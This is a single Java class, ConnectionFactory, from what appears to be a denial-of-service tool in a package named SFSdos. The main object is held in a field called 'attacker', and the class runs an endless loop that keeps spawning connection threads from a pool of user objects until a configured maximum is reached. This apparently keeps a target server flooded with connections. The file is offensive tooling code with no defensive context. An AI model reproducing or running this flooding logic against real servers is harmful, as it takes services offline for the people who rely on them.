package SFSdos.conn;

import SFSdos.Config;
import SFSdos.Main;
import SFSdos.user.UserObject;

import java.util.Iterator;
import java.util.LinkedHashSet;


public class ConnectionFactory implements Runnable {
    public LinkedHashSet connections;
    private Main attacker;

    public ConnectionFactory(Main attacker) {
        this.connections = new LinkedHashSet(Config.maxConnections);
        this.attacker = attacker;
    }

    @Override
    public void run() {
        System.out.println("ConnectionFactory thread started");
        while (true) {
            while (connections.size() < Config.maxConnections) {
                UserObject user = getUser();

                if (user != null) {
                    Connection conn = new Connection(user, this);
                    Thread thread = new Thread(conn);
                    thread.start();
                }
            }

            try {
                Thread.sleep(0);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    private UserObject getUser() {
        for (Iterator iterator = attacker.userFactory.users.iterator(); iterator.hasNext(); ) {
            UserObject user = (UserObject) iterator.next();

            if (!user.isInUse()) {
                return user;
            }
        }

        return null;
    }

}
